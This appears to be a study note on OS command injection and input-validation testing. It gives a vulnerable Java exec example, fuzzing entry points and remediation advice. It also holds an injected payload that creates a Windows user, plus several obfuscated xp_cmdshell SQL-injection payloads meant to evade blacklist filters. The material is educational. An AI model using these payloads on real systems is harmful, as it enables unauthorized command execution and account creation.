# OS Command Injection


* Methodology:
	- Identify data entry points
	- Inject data (payloads)
	- Detect anomalies from the response.
	- Automate



* For example for snippet:

```
String cmd = new String("cmd.exe /K processReports.bat clientId=" + input.getValue("ClientId"));
Process proc = Runtime.getRuntime().exec(cmd);
```

For a client id equal **444**, we would have the following string:

```
cmd.exe /K processReports.bat clientId=444
```

However, an attacker could run use the client id equal **444 && net user hacked hackerd/add**. In this case, we have the following string:

```
cmd.exe /K processReports.bat clientId=444 && net user hacked hacked /add
```

## Examples of Injection Payloads:

* Control characters and common attack strings:
	- '-- SQL injection
	- && | OS Command Injection
	- <> XSS

* Long strings (AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA)

* Binary or Null data


## Fuzz Testing Web Applications

* Focus on the relevant attack surface of the web application.
* Typically HTTP request parameters:
	- QueryString
	- POST data
	- Cookies
	- Other HTTP headers (User-Agent, Referer)

* Other entry points with request structures:
	- XML web services
	- WCF, GWT, AMF
	- Remote Method Invocation (RMI)

* Fixing injection flaws:
	- Comprehensive, consistent server-side input validation
	- User Safe command APIs
	- Avoid concatenating strings passed to an interpreter
	- Use strong data types in favor of strings

### Whitelist input validation
- Input validated against known GOOD values.

- Exact match:
		* A specific list of exact values is defined
		* Difficult when large set of values is expected
- Pattern matching:
		* Values are matched against known good input patterns.
		* Data type, regular expressions, etc.

### Blacklist input validation

- Input validated against known BAD values.
- Not as effective as whitelist validation.
		* Susceptible to bypass via encoding
		* Global protection and therefore often not aware of context.
- Constantly changing given dynamic of application attacks.

#### Evading Blacklist filters

Exploit payloads:

```
';exec xp_cmdshell 'dir';--
```

```
‘;Declare @cmd as varchar(3000);Set @cmd =
 ‘x’+'p’+'_’+'c’+'m’+'d’+’s’+'h’+'e’+'l’+'l’+'/**/’+””+’d’+’i'+’r’+””;exec(@cmd);--
```
```
‘;ex/**/ec xp_cmds/**/hell ‘dir’;--
```

```
Declare @cmd as varchar(3000);Set @cmd
=(CHAR(101)+CHAR(120)+CHAR(101)+CHAR(99)+CHAR(32)+CHAR(109)+CHAR(97)+CHAR(115)+CHA
R(116)+CHAR(101)+CHAR(114)+CHAR(46)+CHAR(46)+CHAR(120)+CHAR(112)+CHAR(95)+CHAR(99)+
CHAR(109)+CHAR(100)+CHAR(115)+CHAR(104)+CHAR(101)+CHAR(108)+CHAR(108)+CHAR(32)+CH
AR(39)+CHAR(100)+CHAR(105)+CHAR(114)+CHAR(39)+CHAR(59));EXEC(@cmd);--
```

```
‘;Declare @cmd as varchar(3000);Set @cmd =
 convert(varchar(0),0×78705F636D647368656C6C202764697227);exec(@cmd);--
```